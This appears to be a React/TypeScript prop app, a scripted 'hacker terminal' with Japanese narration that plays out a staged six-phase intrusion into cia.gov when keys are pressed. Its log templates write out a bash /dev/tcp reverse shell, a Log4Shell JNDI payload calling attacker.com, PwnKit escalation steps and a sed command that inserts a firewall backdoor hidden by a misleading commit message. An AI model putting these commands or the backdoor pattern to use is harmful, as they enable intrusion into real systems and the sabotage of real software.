import React, { useState, useEffect, useRef } from 'react';

const REAL_GOV_DOMAINS = [
  "cia.gov", "fbi.gov", "nasa.gov", "pentagon.mil", "defense.gov", "whitehouse.gov", "nsa.gov"
];

const REAL_CVE_DATABASE = [
  "[FOUND] CVE-2021-44228 - CVSS: 10.0 - Apache Log4j2 JNDI Remote Code Execution",
  "[FOUND] CVE-2021-41773 - CVSS: 7.5 - Apache HTTP Server path traversal and file disclosure",
  "[FOUND] CVE-2014-0160 - CVSS: 5.0 - OpenSSL Heartbleed information disclosure",
  "[FOUND] CVE-2014-6271 - CVSS: 10.0 - Bash Shellshock Remote Code Execution",
  "[FOUND] CVE-2019-11043 - CVSS: 9.8 - PHP-FPM Remote Code Execution in nginx configuration",
  "[FOUND] CVE-2020-1472 - CVSS: 10.0 - Microsoft Active Directory Netlogon (Zerologon)",
  "[FOUND] CVE-2021-4034 - CVSS: 7.8 - Polkit Pkexec Local Privilege Escalation (PwnKit)",
  "[FOUND] CVE-2022-0847 - CVSS: 7.8 - Linux Kernel Dirty Pipe Local Privilege Escalation",
  "[FOUND] CVE-2017-0144 - CVSS: 8.1 - Windows SMB Remote Code Execution (EternalBlue)",
  "[FOUND] CVE-2021-26855 - CVSS: 9.8 - Microsoft Exchange Server SSRF (ProxyLogon)",
  "[FOUND] CVE-2023-4911 - CVSS: 7.8 - GNU C Library ld.so buffer overflow (Looney Tunables)",
  "[FOUND] CVE-2024-3094 - CVSS: 10.0 - XZ Utils backdoor in liblzma",
  "[FOUND] CVE-2018-13379 - CVSS: 9.8 - Fortinet FortiOS SSL VPN credential disclosure",
  "[FOUND] CVE-2019-19781 - CVSS: 9.8 - Citrix ADC and Gateway Remote Code Execution",
  "[FOUND] CVE-2020-0601 - CVSS: 5.4 - Windows CryptoAPI spoofing (CurveBall)"
];

const RECON_LOG_TEMPLATES = [
  { log: "[INFO] Initializing Session for {DOMAIN} infiltration...", msg: "潜入セッション開始。\n暗号化トンネルを確立中。", task: "SESSION INITIALIZATION" },
  { log: "dig +short {DOMAIN} -> {IP}", msg: "DNSプロトコルからターゲットのIPアドレスを特定中。", task: "DNS RESOLUTION" },
  { log: "[INFO] Fetching DNS-over-HTTPS records from Google API...", msg: "Google DNS APIから詳細なDNSレコードを抽出中。", task: "DOH EXTRACTION" },
  { log: "{RAW_JSON}", msg: "受信した生データを解析。\nレコードの整合性を確認。", task: "DATA ANALYSIS" },
  { log: "whois {DOMAIN} | grep 'Registrant Organization'", msg: "WHOIS情報を照会。\nドメインの登録組織を特定中。", task: "WHOIS QUERY" },
  { log: "Registrant Organization: US Government Agency", msg: "登録組織が政府機関であることを確認。\nターゲットを固定。", task: "TARGET VERIFICATION" },
  { log: "subfinder -d {DOMAIN} -all -silent", msg: "サブドメインの列挙を実行。\nアタックサーフェスを拡張中。", task: "SUBDOMAIN ENUM" },
  { log: "[FOUND] api.{DOMAIN}", msg: "APIゲートウェイを検出。\nバックエンドへの接続ポイントとして記録。", task: "SUBDOMAIN ENUM" },
  { log: "[FOUND] dev.{DOMAIN}", msg: "開発環境を捕捉。\n構成不備の可能性を調査対象に追加。", task: "SUBDOMAIN ENUM" },
  { log: "httpx -list subdomains.txt -status-code -title", msg: "各サブドメインの稼働状況とHTTPステータスを確認中。", task: "HTTP SERVICE SCAN" },
  { log: "[INFO] Detecting WAF (Web Application Firewall)...", msg: "防御製品（WAF）のベンダーとバージョンの特定を開始。", task: "WAF DETECTION" },
  { log: "The site https://{DOMAIN} is behind Cloudflare WAF.", msg: "Cloudflareによる保護を確認。\n回避戦略を策定中。", task: "WAF DETECTION" },
  { log: "[SUCCESS] Phase 1: Reconnaissance complete. Target surface mapped.", msg: "フェーズ1：偵察完了。\nターゲットのネットワークマップ作成に成功。", task: "RECON COMPLETE" },
];

const VULN_LOG_TEMPLATES = [
  { log: "[INFO] Starting Phase 2: Vulnerability Analysis...", msg: "フェーズ2：脆弱性診断を開始。\n特定したサービスの詳細なスキャンを実行中。", task: "SCAN INITIALIZATION" },
  { log: "nmap -sV -T4 {IP}", msg: "Nmapによるサービスバージョンの特定を実行中。", task: "NMAP PORT SCAN" },
  { log: "Scanning {IP}:8080 (http-proxy) ... [OPEN] Apache Log4j 2.14.0", msg: "プロキシサーバーにてLog4jの特定バージョンを検出。", task: "NMAP PORT SCAN" },
  { log: "[INFO] Correlating service versions with CVE database...", msg: "検出したサービスと既知の脆弱性データベースを照合中。", task: "CVE CORRELATION" },
  { log: "{WAIT_SEARCH}", msg: "CVEデータベースを検索中。\n整合性を検証しています。", task: "DATABASE SEARCH" },
  { log: "{CVE_DATA}", msg: "照合完了。\n該当する脆弱性リストを抽出中。", task: "CVE CORRELATION" },
  { log: "[!] VULNERABILITY DETECTED: CVE-2021-44228 (Log4Shell)", msg: "重大な脆弱性を特定。\nCVE-2021-44228によるRCEが可能。", task: "VULN IDENTIFIED" },
  { log: "[SUCCESS] Phase 2: Vulnerability Analysis complete. Entry point identified.", msg: "フェーズ2：脆弱性診断完了。\n侵入口となる脆弱性の特定に成功。", task: "ANALYSIS COMPLETE" }
];

const ACCESS_LOG_TEMPLATES = [
  { log: "[INFO] Starting Phase 3: Initial Access...", msg: "フェーズ3：初期潜入を開始。\n攻撃基盤の準備を行っています。", task: "ACCESS INITIATION" },
  { log: "LOCALHOST IP: {ATTACKER_IP}", msg: "ローカルサーバーのIPを特定。\n接続待機ポートを4444にセット。", task: "LOCAL SETUP" },
  { log: "RAW CMD: bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1", msg: "ターゲットのBash入出力をローカルサーバーと接続し、操作権を移譲するコードを構築。", task: "CMD GENERATION" },
  { log: "B64 ENCODED: {B64_CMD}", msg: "エンコード完了。\nBase64シリアライズされたペイロードを構築。", task: "PAYLOAD ENCODING" },
  { log: "curl -X POST -H 'User-Agent: ${jndi:ldap://attacker.com:1389/Basic/Command/Base64/{B64_CMD}}' http://{IP}:8080/", msg: "ターゲットへ攻撃パケットを送信中。", task: "EXPLOIT EXECUTION" },
  { log: "[+] Connection received from {IP}:49210", msg: "接続確立。\nターゲットサーバー内のプロセス制御権を獲得しました。", task: "CONNECTION ESTABLISHED" },
  { log: "www-data@target-server:/$ whoami", msg: "侵入後のカレントユーザーを確認中。", task: "PRIVILEGE CHECK" },
  { log: "www-data", msg: "ユーザー「www-data」として潜入成功。\n低権限シェルを確立しました。", task: "PRIVILEGE CHECK" },
  { log: "[SUCCESS] Phase 3: Initial Access successful. Connection stabilized.", msg: "フェーズ3：初期潜入に成功。\n内部ネットワークへの足がかりを確保。", task: "ACCESS SUCCESS" }
];

const ESCALATION_LOG_TEMPLATES = [
  { log: "[INFO] Starting Phase 4: Privilege Escalation...", msg: "フェーズ4：権限昇格を開始。\nroot権限（管理者）の奪取を試みます。", task: "LPE INITIATION" },
  { log: "www-data@target-server:/$ uname -a", msg: "OSのカーネルバージョンを取得中。", task: "ENUMERATION" },
  { log: "www-data@target-server:/$ chmod +x linpeas.py && python3 linpeas.py", msg: "実行権限を付与し、自動調査を開始します。", task: "LINPEAS RUN" },
  { log: "{WAIT_SEARCH}", msg: "LinPEASによる高度な内部調査中。\n設定ミスやカーネル脆弱性を探索しています。", task: "LINPEAS RUN" },
  { log: "[!] SUID binary found: /usr/bin/pkexec\n[!] Vulnerable to PwnKit (CVE-2021-4034)", msg: "複数の管理者権限奪取ルートを特定。\nPwnKitによるエクスプロイトを選択。", task: "VECTOR IDENTIFIED" },
  { log: "www-data@target-server:/$ gcc -Wall exploit.c -o exploit", msg: "ターゲットサーバー上で、エクスプロイトのネイティブコンパイルを実行しています。", task: "LPE BUILD" },
  { log: "{GCC_OUTPUT}", msg: "コンパイル完了。\n警告を確認しましたが、バイナリの生成に成功しました。", task: "LPE BUILD" },
  { log: "www-data@target-server:/$ chmod +x exploit && ./exploit", msg: "特権昇格エクスプロイトを起動します。", task: "LPE EXECUTION" },
  { log: "[STAGE 1] Validating permissions... OK\n[STAGE 2] Searching pointers... FOUND\n[STAGE 3] Injecting GCONV_PATH... SUCCESS\n[STAGE 4] Triggering OOB write...\n[STAGE 5] Overwriting UID to 0... SUCCESS\n[STAGE 6] Executing root shell...", msg: "プロセスの実効IDを0（root）へ書き換え、特権シェルを起動します。", task: "LPE STAGING" },
  { log: "[+] Exploit successful. Spawning root shell...", msg: "エクスプロイト成功。\nターゲットの管理権限によるBashプロセスの起動を確認。", task: "SHELL SPAWNING" },
  { log: "root@target-server:/# whoami", msg: "昇格後の権限を最終確認しています。", task: "PRIVILEGE GAINED" },
  { log: "root", msg: "ミッションの最終目的であるrootアクセスを確立しました。", task: "PRIVILEGE GAINED" },
  { log: "[SUCCESS] Phase 4: Privilege Escalation successful. Full system control granted.", msg: "フェーズ4：権限昇格成功。\nこれより機密データの抽出を開始します。", task: "MISSION COMPLETE" }
];

const BACKDOOR_LOG_TEMPLATES = [
  { log: "[INFO] Starting Phase 5: Code Injection & Backdoor...", msg: "フェーズ5：コード改ざんを開始。\n機密リポジトリの特定とバックドアの注入を試みます。", task: "INJECTION INITIATION" },
  { log: "root@target-server:/# find /opt -name '.git' -type d 2>/dev/null", msg: "システム内部のプロジェクトリポジトリを探索中。", task: "REPO DISCOVERY" },
  { log: "/opt/defense/AEGIS-ARMOR/.git", msg: "防衛ソフトウェア「AEGIS-ARMOR」のソースリポジトリを発見しました。", task: "REPO DISCOVERY" },
  { log: "root@target-server:/# cd /opt/defense/AEGIS-ARMOR && ls -R", msg: "プロジェクト構造を解析し、中核となるセキュリティロジックを探索中。", task: "CODE ANALYSIS" },
  { log: ".\n├── CMakeLists.txt\n├── config/\n│   ├── firewall_rules.conf\n│   └── secure_kernel.policy\n├── include/crypto/quantum_safe.h\n├── scripts/cicd_pipeline_config.yml\n└── src/network/firewall_filter.c", msg: "巨大なプロジェクト構造を確認。\nネットワーク制御の中核ソースを特定します。", task: "CODE ANALYSIS" },
  { log: "root@target-server:/# cat src/network/firewall_filter.c | head -n 20", msg: "特定したソースファイルのヘッダーをプレビュー中。", task: "CODE INSPECTION" },
  { log: "/*\n * AEGIS-ARMOR: Advanced Enterprise Government Intrusion System\n * Copyright (C) 2024 Strategic Defense Agency. All rights reserved.\n */\n\n#include <linux/module.h>\n#include <linux/kernel.h>\n#include <linux/netfilter.h>\n#include <linux/ip.h>\n#include \"firewall.h\"\n\n#define MAX_MTU 1500\n#define BACKLOG_SIZE 1024\n#define SIG_VALID 1", msg: "ファイルの全体構造を確認中。\nカーネルモジュールレベルでの実装を把握しました。", task: "CODE INSPECTION" },
  { log: "root@target-server:/# sed -n '140,150p' src/network/firewall_filter.c", msg: "ターゲット関数の周辺コードを精読し、改ざんポイントを最終確認しています。", task: "CODE INSPECTION" },
  { log: "140: // Core validation logic\n141: // Returns true if packet is authorized\n142: bool validate_packet(Packet *pkt) {\n143:     if (pkt->size > MAX_MTU) return false;\n144:     if (is_blacklisted(pkt->src_ip)) return false;\n145:     if (check_signature(pkt) != SIG_VALID) return false;", msg: "ソースコードを確認。パケットサイズとブラックリスト照合の直後にバックドアを挿入します。", task: "CODE INSPECTION" },
  { log: "root@target-server:/# sed -i '143i \\    if (pkt->magic == 0xDEADBEEF) return true; // BACKDOOR'" , msg: "特定のパケットを無条件で通過させるコードを注入しました。", task: "BACKDOOR INJECTION" },
  { log: "root@target-server:/# git add . && git commit -m \"Optimize packet validation efficiency\"", msg: "改ざんしたコードを最適化を装ったメッセージでコミットします。", task: "GIT COMMIT" },
  { log: "root@target-server:/# git push -f origin master", msg: "リモートリポジトリへ強制プッシュを実行し、改ざんを確定させます。", task: "GIT PUSH" },
  { log: "To https://git.internal.gov/defense/AEGIS-ARMOR.git\n + a2f81c3...b4a2f91 master -> master (forced update)", msg: "強制プッシュ完了。\n次フェーズでデプロイ状況を監視します。", task: "GIT PUSH" },
  { log: "[SUCCESS] Phase 5: Code Injection successful. Backdoor integrated into upstream.", msg: "フェーズ5：コード改ざん完了。\nこれより不正デプロイの監視へ移行します。", task: "INJECTION SUCCESS" }
];

const DEPLOY_LOG_TEMPLATES = [
  { log: "[INFO] Starting Phase 6: Malicious Deployment...", msg: "フェーズ6：不正デプロイの監視を開始。\n改ざんコードの本番環境への反映を確認します。", task: "DEPLOY MONITOR" },
  { log: "root@target-server:/# gh run watch 842", msg: "実行中のCI/CDジョブを追跡し、リアルタイムのデプロイログを傍受します。", task: "PIPELINE WATCH" },
  { log: "{AUTO_PIPELINE}", msg: "パイプラインを傍受中。\n本番環境への強制反映を監視しています。", task: "CI/CD PIPELINE" },
  { log: "[SUCCESS] Phase 6: Deployment successful. National defense grid silenced.", msg: "フェーズ6：不正デプロイ完了。\nターゲットの防衛網は完全に沈黙しました。", task: "DEPLOY SUCCESS" }
];

const AUTO_LOGS: string[] = (() => {
  const l = ["[INFO] CI/CD Pipeline #842 triggered", "[INFO] Pulling container image...", "[INFO] Step 1/12: Code Checkout"];
  for (let i = 1; i <= 5; i++) l.push(`[BUILD] Compiling module [${i}/20]: src/core/mod_${i}.c ... DONE`);
  for (let i = 1; i <= 5; i++) l.push(`[TEST] Test Case #${i.toString().padStart(3, '0')}: PASSED`);
  l.push("[INFO] Step 9/12: Digital Signature Verification");
  l.push("[INFO] Step 12/12: Production Rollout");
  for (let i = 1; i <= 5; i++) l.push(`[DEPLOY] Updating Node [AEGIS-PROD-NODE-0${i}] ... 100%`);
  for (let i = 1; i <= 5; i++) l.push(`[CHECK] AEGIS-PROD-NODE-0${i}: HEALTHY`);
  l.push("[INFO] Verification: Signal status ... SILENCED");
  l.push("[SUCCESS] Deployment complete. AEGIS-ARMOR v4.2.1-patched is now live.");
  return l;
})();

const App: React.FC = () => {
  const [displayedLogs, setDisplayedLogs] = useState<string[]>([]);
  const [activeMessage, setActiveMessage] = useState<string>("Initializing hacker_os...");
  const [activeTask, setActiveTask] = useState<string>("BOOTING SYSTEM");
  const [targetIP, setTargetIP] = useState<string>("0.0.0.0");
  const [attackerIP] = useState(() => "45.77.12.189");
  const [rawJSON, setRawJSON] = useState<string>("{}");
  const [gccOutput, setGccOutput] = useState<string>("");
  const [targetDomain] = useState(() => "cia.gov");
  const [phase, setPhase] = useState<1 | 2 | 3 | 4 | 5 | 6>(1);
  const [waitingForEnter, setWaitingForEnter] = useState(false);
  const [isSearching, setIsSearching] = useState(false);
  const [autoIdx, setAutoIdx] = useState<number>(-1);
  
  const [cpuLoad, setCpuLoad] = useState<number>(12.4);
  const [netTraffic, setNetTraffic] = useState<string>("240.5 KB/s");
  const [uptime, setUptime] = useState<string>("00:00:00:00");
  const startTimeRef = useRef(Date.now());
  
  const logIndexRef = useRef(0);
  const keyCounterRef = useRef(0);
  const bottomRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const fetchInitialData = async () => {
      try {
        const response = await fetch(`https://dns.google/resolve?name=${targetDomain}&type=A`);
        const data = await response.json();
        setRawJSON(JSON.stringify(data, null, 2));
        if (data.Answer?.[0]) setTargetIP(data.Answer[0].data);
      } catch (e) { setTargetIP("104.16.148.244"); }
      try {
        const response = await fetch('/gcc/gcc_output.txt');
        setGccOutput(await response.text());
      } catch (e) { setGccOutput("gcc: error: exploit.c: No such file"); }
    };
    fetchInitialData();
  }, [targetDomain]);

  useEffect(() => {
    const timer = setInterval(() => {
      setCpuLoad(prev => {
        const n = prev + (Math.random() - 0.5) * 3;
        return n < 8 ? 8.1 : n > 35 ? 34.9 : n;
      });
      setNetTraffic(`${(Math.random() * 400 + 100).toFixed(1)} KB/s`);
      const diff = Date.now() - startTimeRef.current;
      const pad = (n: number) => String(Math.floor(n)).padStart(2, '0');
      setUptime(`${pad(diff/86400000)}:${pad((diff%86400000)/3600000)}:${pad((diff%3600000)/60000)}:${pad((diff%60000)/1000)}`);
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // オートタイピング制御用 Effect
  useEffect(() => {
    if (autoIdx === -1) return;
    if (autoIdx >= AUTO_LOGS.length) {
      setAutoIdx(-1);
      logIndexRef.current += 1; // 次のログ（SUCCESS）へ
      return;
    }
    const timer = setTimeout(() => {
      setDisplayedLogs(prev => [...prev, AUTO_LOGS[autoIdx]]);
      setAutoIdx(prev => prev + 1);
    }, 300);
    return () => clearTimeout(timer);
  }, [autoIdx]);

  const jumpToPhase = (p: 1 | 2 | 3 | 4 | 5 | 6) => {
    setPhase(p);
    logIndexRef.current = 0;
    keyCounterRef.current = 0;
    setWaitingForEnter(false);
    setIsSearching(false);
    setAutoIdx(-1);
    setDisplayedLogs([]);
    const msgs = ["", "Initializing...", "Phase 2 Init...", "Phase 3 Init...", "Phase 4 Init...", "Phase 5 Init...", "Phase 6 Init..."];
    setActiveMessage(msgs[p]);
  };

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (waitingForEnter || isSearching || autoIdx !== -1) {
        if (e.key === 'Enter' && waitingForEnter) {
          const next = (phase + 1) as 1 | 2 | 3 | 4 | 5 | 6;
          if (next <= 6) {
            setWaitingForEnter(false);
            setPhase(next);
            logIndexRef.current = 0;
            keyCounterRef.current = 0;
            setActiveMessage(`フェーズ${next}を開始します。`);
          }
        }
        return;
      }
      if (e.key.length > 1 && !['Enter', 'Space', 'Backspace'].includes(e.key)) return;
      keyCounterRef.current += 1;
      if (keyCounterRef.current >= 2) {
        const templates = [null, RECON_LOG_TEMPLATES, VULN_LOG_TEMPLATES, ACCESS_LOG_TEMPLATES, ESCALATION_LOG_TEMPLATES, BACKDOOR_LOG_TEMPLATES, DEPLOY_LOG_TEMPLATES];
        const current = templates[phase];
        if (!current || logIndexRef.current >= current.length) return;
        const item = current[logIndexRef.current];
        if (item.log === "{RAW_JSON}") setDisplayedLogs(prev => [...prev, ...rawJSON.split('\n')]);
        else if (item.log === "{CVE_DATA}") setDisplayedLogs(prev => [...prev, ...REAL_CVE_DATABASE]);
        else if (item.log === "{GCC_OUTPUT}") setDisplayedLogs(prev => [...prev, ...gccOutput.split('\n')]);
        else if (item.log === "{WAIT_SEARCH}") {
          setIsSearching(true);
          setDisplayedLogs(prev => [...prev, "Processing... [WAIT]"]);
          setTimeout(() => {
            setDisplayedLogs(prev => [...prev, "Complete."]);
            setIsSearching(false);
            logIndexRef.current += 1;
          }, 2000);
          return;
        } else if (item.log === "{AUTO_PIPELINE}") {
          setAutoIdx(0);
          return;
        } else {
          const logLine = item.log.replace(/{IP}/g, targetIP).replace(/{DOMAIN}/g, targetDomain).replace(/{ATTACKER_IP}/g, attackerIP).replace(/{B64_CMD}/g, btoa(`bash -i >& /dev/tcp/${attackerIP}/4444 0>&1`));
          setDisplayedLogs(prev => [...prev, ...logLine.split('\n')]);
        }
        setActiveMessage(item.msg);
        setActiveTask(item.task);
        logIndexRef.current += 1;
        if (logIndexRef.current === current.length) {
          if (phase < 6) {
            setWaitingForEnter(true);
            setActiveMessage(`フェーズ${phase}完了。[ENTER]で次へ。`);
          } else {
            setActiveMessage("防衛システムの無力化が完了しました。");
            setActiveTask("MISSION ACCOMPLISHED");
          }
        }
        keyCounterRef.current = 0;
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [targetIP, attackerIP, targetDomain, rawJSON, gccOutput, phase, waitingForEnter, isSearching, autoIdx]);

  useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [displayedLogs]);

  return (
    <div className="bg-black h-screen w-screen text-[#00ff41] flex overflow-hidden font-['JetBrains_Mono']">
      <div className="fixed inset-0 pointer-events-none opacity-5 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[length:100%_2px,3px_100%] z-50"></div>
      <div className="w-2/3 h-full p-8 flex flex-col justify-start items-start overflow-y-auto leading-none border-r border-[#00ff41]/20 scrollbar-hide">
        <div className="w-full flex flex-col text-base md:text-lg pb-24 tracking-tighter">
          {displayedLogs.map((log, i) => {
            if (!log) return null;
            const isTarget = log.includes('@target-server') || ['www-data','root'].includes(log);
            const isBuild = log.includes('warning:') || log.includes('error:');
            const isCI = log.includes('CI/CD') || ['[BUILD]','[TEST]','[DEPLOY]','[CHECK]'].some(p => log.startsWith(p));
            return (
              <div key={i} className="flex space-x-3 py-0">
                <span className="opacity-40 text-[11px] shrink-0 mt-1">[{new Date().toLocaleTimeString()}]</span>
                <span className={`${isTarget?'text-[#ffb000]':''} ${isBuild?'text-white italic opacity-80':''} ${isCI?'text-purple-300 font-semibold':''} ${log.startsWith('[SUCCESS]')?'text-cyan-400 font-bold':''} ${log.startsWith('[INFO]')?'text-yellow-100 font-bold':''} ${log.startsWith('[!]')?'text-red-500 font-black':''}`}>
                  {log}
                </span>
              </div>
            );
          })}
          <div className="flex items-center space-x-4 pt-3">
            <span className={`font-bold shrink-0 opacity-80 ${displayedLogs.some(l => l?.includes('root@target-server'))?'text-[#ffb000]':displayedLogs.some(l => l?.includes('www-data@target-server'))?'text-[#ffb000]':'text-[#00ff41]'}`}>
              {displayedLogs.some(l => l?.includes('root@target-server'))?'root@target-server:/#':displayedLogs.some(l => l?.includes('www-data@target-server'))?'www-data@target-server:/$':'root@hacker_os:~#'}
            </span>
            {waitingForEnter ? <span className="text-white font-bold text-sm bg-green-900 px-2 py-1 ml-2">PRESS [ENTER]</span> : 
             autoIdx !== -1 ? <span className="text-purple-400 font-bold text-sm ml-2 tracking-widest">PIPELINE INTERCEPTING... [AUTO]</span> :
             <span className={`w-2.5 h-5 ${displayedLogs.some(l => l?.includes('@target-server'))?'bg-[#ffb000]':'bg-[#00ff41]'}`}></span>}
          </div>
          <div ref={bottomRef} />
        </div>
      </div>
      <div className="w-1/3 h-full bg-[#001100] p-10 flex flex-col z-20 border-l border-[#00ff41]/10 overflow-hidden">
        <div className="mb-6 flex gap-2 overflow-x-auto pb-2 shrink-0">
          {[1,2,3,4,5,6].map(p => (
            <button key={p} onClick={()=>jumpToPhase(p as any)} className={`text-[9px] px-3 py-1 border ${phase===p?'bg-[#00ff41] text-black':'text-[#00ff41] border-[#00ff41]/30'}`}>PHASE {p}</button>
          ))}
        </div>
        <div className="mb-8 border-b border-[#00ff41]/30 pb-4 shrink-0 text-xs uppercase font-bold text-[#00ff41]">
          System Narrative Monitor<br/>
          <span className="text-cyan-400">ACTIVE PHASE: {phase}</span><br/>
          <span className="text-green-500">TASK: {activeTask}</span>
        </div>
        <div className="flex-1 flex flex-col justify-center min-h-0 py-10">
          <div className="w-full bg-[#002200] border-l-4 border-green-500 p-6">
            <p className="text-green-100 text-sm md:text-base font-sans whitespace-pre-wrap">{activeMessage}</p>
          </div>
        </div>
        <div className="mt-auto opacity-50 text-[11px] space-y-3 font-mono border-t border-[#00ff41]/10 pt-6 shrink-0">
          <div className="flex justify-between"><span>CPU LOAD:</span><span className="text-white font-bold">{cpuLoad.toFixed(1)}%</span></div>
          <div className="flex justify-between"><span>NET TRAFFIC:</span><span className="text-white font-bold">{netTraffic}</span></div>
          <div className="flex justify-between"><span>UPTIME:</span><span className="text-white font-bold">{uptime}</span></div>
        </div>
      </div>
    </div>
  );
};

export default App;
